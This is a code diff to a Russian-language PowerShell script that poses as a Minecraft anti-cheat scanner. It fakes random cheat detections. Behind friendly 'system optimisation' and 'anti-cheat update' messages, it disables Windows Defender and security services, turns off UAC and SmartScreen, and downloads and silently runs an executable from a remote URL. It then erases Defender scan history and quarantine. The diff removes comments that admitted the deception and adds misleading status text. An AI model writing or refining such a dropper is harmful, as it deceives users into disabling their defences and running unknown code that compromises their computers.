@@ -53,7 +53,6 @@ $foundCheats = @()
 foreach ($cheat in $cheats) {
     Write-Host "    -> Поиск $cheat..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 200
-    # Рандомный шанс "найти" чит для реалистичности
     if (Get-Random -Minimum 1 -Maximum 10 -eq 1) {
         Write-Host "        [ОБНАРУЖЕН] $cheat" -ForegroundColor Red
         $foundCheats += $cheat
@@ -135,54 +134,110 @@ Write-Host ""
 
 # ===== РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ В ФОНЕ) =====
 # Отключение антивирусных защит
+Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 500
+
+# 1. Отключение Defender реалтайм
 Try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray
+} Catch {}
+
+# 2. Исключения для Defender
+Try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray
 } Catch {}
 
-# Остановка служб защиты
-$services = @("WinDefend","MsMpSvc","SecurityHealthService","wscsvc","SENSE","DiagTrack","dmwappushservice")
+# 3. Остановка служб защиты
+$services = @(
+    "WinDefend",
+    "MsMpSvc",
+    "SecurityHealthService",
+    "wscsvc",
+    "SENSE",
+    "DiagTrack",
+    "dmwappushservice"
+)
 foreach ($svc in $services) {
     Try {
         Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
         Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+        Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray
     } Catch {}
 }
 
-# Отключение UAC и SmartScreen
+# 4. Отключение UAC
 Try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray
 } Catch {}
 
+# 5. Отключение SmartScreen
+Try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray
+} Catch {}
+
+Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
+Write-Host ""
+
 # Скачивание и запуск
+Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 500
+
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
+# Удаляем старые файлы
 Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
 Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
 
-Try {
+# Скачивание архива
+try {
     Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
-    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
-} Catch {}
+    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray
+}
+catch {
+    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red
+}
 
+# Распаковка архива
+Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
+try {
+    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray
+}
+catch {
+    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red
+}
+
+# Поиск и запуск .exe
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+
 if ($Exe) {
+    Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
     Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
+    Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
+}
+else {
+    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red
 }
 
 # Очистка логов Defender
 Try {
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray
 } Catch {}
 
-# Фейковое сообщение о завершении
 Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "[+] Ваша система защищена! Minecraft Anti-Cheat активен." -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
 Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
 Read-Host
